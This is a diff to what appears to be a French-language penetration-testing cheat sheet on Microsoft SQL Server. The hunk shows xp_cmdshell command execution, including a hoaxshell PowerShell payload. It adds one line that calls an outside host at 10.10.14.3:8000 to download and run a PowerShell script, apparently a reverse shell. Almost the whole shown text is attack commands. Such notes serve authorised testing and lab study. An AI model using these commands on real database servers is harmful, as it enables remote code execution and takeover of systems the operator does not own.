@@ -162,7 +162,11 @@ RECONFIGURE
 --  Execution de commande (after enabling it)
 xp_cmdshell whoami
 xp_cmdshell "powershell -e <hoaxshell payload>";
+
+xp_cmdshell "powershell IEX(New-Object Net.webclient).downloadString(\"http://10.10.14.3:8000/rv``.ps1\")";
+
 ```
+
 
 #### Capture de Hash
 
